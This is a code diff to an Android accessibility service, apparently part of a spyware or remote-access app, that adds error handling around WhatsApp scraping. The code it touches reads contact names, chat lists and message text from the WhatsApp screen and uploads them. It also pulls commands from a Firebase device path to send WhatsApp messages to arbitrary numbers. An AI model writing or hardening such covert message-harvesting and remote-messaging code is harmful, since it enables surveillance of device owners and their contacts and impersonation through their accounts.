@@ -315,7 +315,11 @@ class WhatsAppService : AccessibilityService() {
         return try {
             val conversationLayouts = listOf("conversation_layout", "chat_layout", "conversation_container")
             conversationLayouts.any { id ->
-                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
+                try {
+                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
+                } catch (e: Exception) {
+                    false
+                }
             }
         } catch (e: Exception) {
             false
@@ -326,7 +330,11 @@ class WhatsAppService : AccessibilityService() {
         return try {
             val chatRowIds = listOf("conversations_row", "chat_row", "conversation_item")
             chatRowIds.any { id ->
-                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
+                try {
+                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
+                } catch (e: Exception) {
+                    false
+                }
             }
         } catch (e: Exception) {
             false
@@ -337,11 +345,19 @@ class WhatsAppService : AccessibilityService() {
         try {
             val messageIds = listOf("message_text", "text_message", "message_body", "chat_message_text")
             val messageNodes = messageIds.flatMap { id ->
-                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
+                try {
+                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
+                } catch (e: Exception) {
+                    emptyList()
+                }
             }
 
             messageNodes.forEach { node ->
-                extractAndUploadMessage(node, packageName)
+                try {
+                    extractAndUploadMessage(node, packageName)
+                } catch (e: Exception) {
+                    Logger.error("Error extracting message from node", e)
+                }
             }
         } catch (e: Exception) {
             Logger.error("Error extracting messages from chat", e)
@@ -393,7 +409,11 @@ class WhatsAppService : AccessibilityService() {
         return try {
             val outgoingIds = listOf("outgoing_msg_indicator", "sent_indicator", "message_status")
             outgoingIds.any { id ->
-                parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
+                try {
+                    parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
+                } catch (e: Exception) {
+                    false
+                }
             }
         } catch (e: Exception) {
             false
@@ -405,9 +425,13 @@ class WhatsAppService : AccessibilityService() {
             val rootNode = rootInActiveWindow ?: return null
             val titleIds = listOf("conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title")
             titleIds.forEach { id ->
-                val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
-                if (titleNode != null) {
-                    return titleNode.text?.toString()
+                try {
+                    val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
+                    if (titleNode != null) {
+                        return titleNode.text?.toString()
+                    }
+                } catch (e: Exception) {
+                    // Continue to next ID
                 }
             }
             null
@@ -449,27 +473,43 @@ class WhatsAppService : AccessibilityService() {
         try {
             val chatRowIds = listOf("conversations_row", "chat_row", "conversation_item")
             val chatNodes = chatRowIds.flatMap { id ->
-                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
+                try {
+                    rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
+                } catch (e: Exception) {
+                    emptyList()
+                }
             }
             
             val chats = mutableListOf<Map<String, Any>>()
 
             chatNodes.forEach { chatNode ->
-                val nameIds = listOf("conversation_contact_name", "contact_name", "chat_title")
-                val name = nameIds.mapNotNull { id ->
-                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
-                }.firstOrNull() ?: ""
+                try {
+                    val nameIds = listOf("conversation_contact_name", "contact_name", "chat_title")
+                    val name = nameIds.mapNotNull { id ->
+                        try {
+                            chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
+                        } catch (e: Exception) {
+                            null
+                        }
+                    }.firstOrNull() ?: ""
 
-                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/conversation_last_message")
-                    .firstOrNull()?.text?.toString() ?: ""
+                    val lastMessage = try {
+                        chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/conversation_last_message")
+                            .firstOrNull()?.text?.toString() ?: ""
+                    } catch (e: Exception) {
+                        ""
+                    }
 
-                if (name.isNotEmpty()) {
-                    chats.add(mapOf(
-                        "name" to name,
-                        "lastMessage" to lastMessage,
-                        "timestamp" to System.currentTimeMillis(),
-                        "packageName" to packageName
-                    ))
+                    if (name.isNotEmpty()) {
+                        chats.add(mapOf(
+                            "name" to name,
+                            "lastMessage" to lastMessage,
+                            "timestamp" to System.currentTimeMillis(),
+                            "packageName" to packageName
+                        ))
+                    }
+                } catch (e: Exception) {
+                    Logger.error("Error processing chat node", e)
                 }
             }
 
@@ -494,15 +534,19 @@ class WhatsAppService : AccessibilityService() {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     try {
                         snapshot.children.forEach { command ->
-                            val number = command.child("number").getValue(String::class.java) ?: return@forEach
-                            val message = command.child("message").getValue(String::class.java) ?: return@forEach
-                            val packageName = command.child("packageName").getValue(String::class.java) 
-                                ?: Constants.WHATSAPP_PACKAGE
+                            try {
+                                val number = command.child("number").getValue(String::class.java) ?: return@forEach
+                                val message = command.child("message").getValue(String::class.java) ?: return@forEach
+                                val packageName = command.child("packageName").getValue(String::class.java) 
+                                    ?: Constants.WHATSAPP_PACKAGE
 
-                            Logger.log("Received send command for $number: $message ($packageName)")
+                                Logger.log("Received send command for $number: $message ($packageName)")
 
-                            pendingCommands.add(SendCommand(number, message, packageName))
-                            command.ref.removeValue()
+                                pendingCommands.add(SendCommand(number, message, packageName))
+                                command.ref.removeValue()
+                            } catch (e: Exception) {
+                                Logger.error("Error processing individual command", e)
+                            }
                         }
                     } catch (e: Exception) {
                         Logger.error("Error processing send commands", e)
@@ -645,8 +689,12 @@ class WhatsAppService : AccessibilityService() {
 
             scope.cancel()
             valueEventListener.forEach { (_, listener) ->
-                db.child("Device").child(deviceId).child("whatsapp/commands")
-                    .removeEventListener(listener)
+                try {
+                    db.child("Device").child(deviceId).child("whatsapp/commands")
+                        .removeEventListener(listener)
+                } catch (e: Exception) {
+                    Logger.error("Error removing listener", e)
+                }
             }
             valueEventListener.clear()
             Logger.log("WhatsAppService destroyed")
